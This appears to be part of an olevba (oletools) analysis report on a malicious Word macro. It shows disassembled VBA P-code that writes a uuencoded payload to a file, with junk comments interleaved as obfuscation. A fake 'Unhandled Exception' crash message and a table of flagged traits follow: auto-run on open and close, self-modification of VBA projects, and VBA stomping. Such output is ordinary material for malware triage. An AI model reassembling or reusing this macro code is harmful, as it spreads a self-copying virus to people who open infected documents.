' 	LitStr 0x000E "M;(ZP5-XB\%]'M"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0024 "[!S[&:`*;H@6P*Q9M*R`Q2-H.5;E&4Z&I1Z!"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "TG52I,$B"
' 	Add 
' 	PrintItemNL 
' Line #191:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M08+=D&QC'2/-H>'L*:[?@^4$PYRDSA2P5(3S,W(86LE_K8I0#@(2RQJTP>J!"
' 	PrintItemNL 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "M2_3$2XJN85YX9#&6QKI,<A5CRFZ\SK"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "`[8)8Z9AC]B+GY0.DYOB-4;D<_U:W"
' 	Add 
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "MM4O`*&OK)UX)=#3LS1<[%%S!0J._"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0019 "/@.JI._G?4,<%W=;:VKP;&#-O"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 ";YJ4-"
' 	Add 
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "M#C7<I-M\O:M..HW(V,7^!!FU707J"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001E "_B48??,4!*#O$$XT#9E&TX#P#L$'FG"
' 	Add 
' 	PrintItemNL 
' Line #195:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M@],X7G.*822L0!N!E97:2P9H56;#/`1RT5Y6HF,W@-'&+R'!&@@`__].?&,7"
' 	PrintItemNL 
' Line #196:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "M:'8Q*_%G`FCG3"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "4M`X=VNM,,&:5DK^AQ"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "'V-EK"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "3\C->H7[P!WC;#KP3]?.&"
' 	Add 
' 	PrintItemNL 
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MCVZ-LVU]9@>DETPPK3-_LAW`X0<-_S!NP!/H`JVV=@>6,FD>CZQPPO-:./Z="
' 	PrintItemNL 
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M9=TE!75\SWCGO?UX4`WSD/'9&]AOC)0G%\KTC8[(J<8<,$GZ'*F9A\719-X%"
' 	PrintItemNL 
' Line #199:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "M<!O4`.[J=(0I'(VGMN!IQ\]($M@$!L`N^L`RT?"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "!<Q=?#-(/=$;&'#(+RYB!"
' 	Add 
' 	PrintItemNL 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MMCK`%W9PI+F]U5^,T'Y+_7$H>,/87W[3LW849GEOR4<76A)1<!D`EEZ7KAV3"
' 	PrintItemNL 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "M./WP26U&2!BMOLO=4\8+'D&R!1&2"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F ")8(7]@8GKAC-Z%,)'+UR5L1*>=3;6JZ"
' 	Add 
' 	PrintItemNL 
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "M3U`D8;%/$&D^<PDO,@\Z:E54&>&6`R9/.J$T(1PQ(2`6\/19/)0'X"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 ";G33_S"
' 	Add 
' 	PrintItemNL 
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "M=8$WBU#I`IPY&D?2)#U&@J9,&0:,['X%MWKKCW)[W$6ZP$O"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "AU3`K)(,L$08"
' 	Add 
' 	PrintItemNL 
' Line #204:
' 	QuoteRem 0x0000 0x005F "~fOt`_"R-2lF9o(,IL$wKd^@dN|jTnb_v{y;3^0hRnV,z8Nz0o2qTb~]!|>E`OK{<.Z<9b(py,f4)tzSWDuV*2Ou5X<x7"
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MF3+C6,K2UT3LT1PGJP/5D.2*VFXO<YY!+K-@T7/^9'Z54E)_6.B';HRBB>[!"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "M$.W6#/]]A.GMAB'[8O?IR,/##S#2FVA;K:8#/MC!(:8\JX[-R8"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "AN:V(@Z]R"
' 	Add 
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MU9L1F70R0>'DPVB_:E%8+4=5(39SK%0U$0Q:P-2#(`&4Y4$>M=:IY9729*AS"
' 	PrintItemNL 
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "MJ@.U6*(.RU-@?GXIX[\P*22*`3UVX$GMJJB!*WGVSD/NI(ZH0"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "3"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Z1<S"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "+!D"
' 	Add 
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "M[KO1\7&9B;B-U17MI(4"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0028 "X!3I-6\B5N%5);,ZZ(DP4P9Q9YHCKGJ$YU8T#HE."
' 	Add 
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "MQP&882)&+RG)L)B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002C "X;1]%-TV3;TS%![R.]O.\&XSO$V>GJ5N`KS0>]#E4!1F"
' 	Add 
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "MLB+AE"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0036 "BSR(-W8/Z8MX`M%7.DLKU'%V.NH=N^A)_4XGK^C62I&TS1_3Q:%DL@"
' 	Add 
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "M2#!8RBEZ[L1DR231D45$[E@,&G@W.I.WBNF0$H>L%P6<B-!.[F-4,H:U"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "R)?"
' 	Add 
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "MGZ"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0016 "E5LLA>;+J3;71:*(A-\Y!'"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0014 "TWB*C!T0,P$4G.P`CD`J"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "L^\96>UYT+^[$"
' 	Add 
' 	PrintItemNL 
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M1;:*QW1+=F]*<&0E(VB6I8_Y`R=8PY15=0[,;'1<RM%6Y@`^8:YC/):(L34B"
' 	PrintItemNL 
' Line #215:
' 	QuoteRem 0x0000 0x0005 ">%mv."
' Line #216:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "MY#8GJW0^!P(AGU,!+P+%N$B<T#=$=ZNSM#->B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0016 "$9]!7<[V4:X\):XZ/EH,?X"
' 	Add 
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "M`':7(EPQ1D6[%#'`=N0T$PR+4-KJ0WZBT!B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 ",Z)N3@E_.9%P9Y,T7RXU]X[1"
' 	Add 
' 	PrintItemNL 
' Line #218:
' 	QuoteRem 0x0000 0x005B "i4j4f)y].&W4e@6i4g_q46y"yTzJRJEpB2Z#H-Yp#[Hpp(huvU`L;,oTf$_SPb%Yg"1*m8OO"b(1`vCx'(f53kg68"
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "M=V&&^8YT,8"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0031 "VQ`-F1389.LXVM)N1T)T'N+3(VDI0-Q9!++$BF+Q6U7:CK-2]"
' 	Add 
' 	PrintItemNL 
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "M''^\T6>_Q0IFBQIJ%5NHY@SQEA#U*D1H*5"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0019 "7;.='Y(7@BSPM^Z,L?1\-YD;L"
' 	Add 
' 	PrintItemNL 
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "M0A69H1VQ]D\=AI!_H.WS34B4\5I8B+J*.B[Q4'.8[F9X0"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D ";F1>8H'K8P^14"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #222:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MP\%/*>!8)&U1-AE1;_*/0<?@3YTFQ\JNT**CRCN(R+S,;S`&BF&J^R7;S7B1"
' 	PrintItemNL 
' Line #223:
' 	QuoteRem 0x0000 0x0008 "?N,?~7Y"
' Line #224:
' 	QuoteRem 0x0000 0x0021 "`&."8F0/N/sJr]y"~o{R,cSA)fqF6`5{n"
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M<+XXXHQ0=$?&AW#)J@^$$/$X&ST>[<Q\-2!,PM!0UG'/2-T$1FE86=_^5UPP"
' 	PrintItemNL 
' Line #226:
' 	QuoteRem 0x0000 0x0056 "sXRW<0G<9-%u&3aq(iFgA>G76d/X_FLpf}a_"|6`<OqJDB3jGIf5<?^rF8E9O3(q:K;ADoCo)Q{CqE7v4cCb"
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "M;M`$=&&-`,HD0B.MH_[*`%76&#U$Y`9XE]+)&D,).:L=W!C#3LOVQ1=B&-U"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "M>F])ZQ\AKB"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0031 "4N6$)LASV6C+@D8[3I0AE\$TEQ<3-VD/Z+Z_TC>/36?\+SXMB"
' 	Add 
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "M`_86'\TI5_,6OC("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002C "1V['1K8YD!<98JN%[?VW#[P%BCG(N&.@B-,2^51O3;0("
' 	Add 
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MX33S.I1VE-V[KV*$?BSE)<.3;:&;1F0+#P=NH>(@HT/&-[1WTD+Y)=@>VQ-K"
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M5=YY/'V7IG:6?)7E?!?(JX54-EIF;2NKATBQ@'VOXR[SD-?7FBNV,D_G0@*!"
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "MN.$["
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "(!H5KEG3]_8W7$.%NSW)#IZ=[K/D\5J/O(&D()L5A73>T.<[X,;,1H\"
' 	Add 
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MMQQV#>+@CZ+>3'FS<:(E6@X+DSNI(2:R;2.UD+Z4]X%=Z3%2;4AU:G+3V(3)"
' 	PrintItemNL 
' Line #234:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "MV)`C>_6"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "KT7S>]+\%O@_4$L!`A0`%``"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "``@`@Q$"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "*X_5"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Q7N"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "0``#A8```@`"
' 	Add 
' 	PrintItemNL 
' Line #235:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M`````````0`@`+:!`````$EN9F\N:'1M4$L%!@`````!``$`-@```!0*````"
' 	PrintItemNL 
' Line #236:
' 	QuoteRem 0x0000 0x0022 "S4#{4v)aR]&IT&[R=oF:~;ns(^uJ1*SYYL"
' Line #237:
' 	QuoteRem 0x0000 0x0057 "kT VSFEoh~/6[@MD1sMuG6J}I\1<%-^$VVr9`8 DqFu*lGQM6c /yWg)xMh:$DAmiW <&UUEr9OZBRbH~e6Z6n["
' Line #238:
' 	QuoteRem 0x0000 0x0010 "M(2LY>y|8=k3?@"
' Line #239:
' 	QuoteRem 0x0000 0x0039 "CX:Ez@{rAqA(P$~e?eqiV-D|o(Y@n!M&qOUQ]zxV?W57aY3P`^3:5R-w6"
' Line #240:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "!````"
' 	PrintItemNL 
' Line #241:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "`"
' 	PrintItemNL 
' Line #242:
' 	QuoteRem 0x0000 0x0069 "FAn/n|]{yG0xRF,QS2R:acIQAm"8ixrL?s=O?uJji"zjQbG5iKyST0eQi=9@4LOe$:CEDKXm3']$P:$+_zw=)s[z0&{<;E8s?7!j8m[L""
' Line #243:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "end"
' 	PrintItemNL 
' Line #244:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #245:
' 	QuoteRem 0x0000 0x0032 "V\!<NQ[x_0Bi+":q`>|I<S5)$-!+PS~O+[3d%CPC^*"oKJ8M"
' Line #246:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #247:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #248:
' 	EndIfBlock 
' Line #249:
' 	EndSub 
' Line #250:
' 	QuoteRem 0x0000 0x0041 "eO/FC#5=Yq^j;i2R&M'~UgD#ppY094]kPRuhfj]71kftzxFxwM~)Sgk/1V8*GosE"
' Line #251:
' 	FuncDefn (Sub BlowUp())
' Line #252:
' 	LitStr 0x0021 "Unhandled Exception at FE35:5320h"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x000D "running on a "
' 	Add 
' 	Ld System 
' 	MemLd ProcessorType 
' 	Add 
' 	LitStr 0x000A " processor"
' 	Add 
' 	LitDI2 0x0010 
' 	LitStr 0x000F "Micro$oft Word "
' 	Ld Application 
' 	MemLd Version 
' 	Add 
' 	ArgsCall MsgBox 0x0003 
' Line #253:
' 	EndSub 
' Line #254:
' Line #255:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

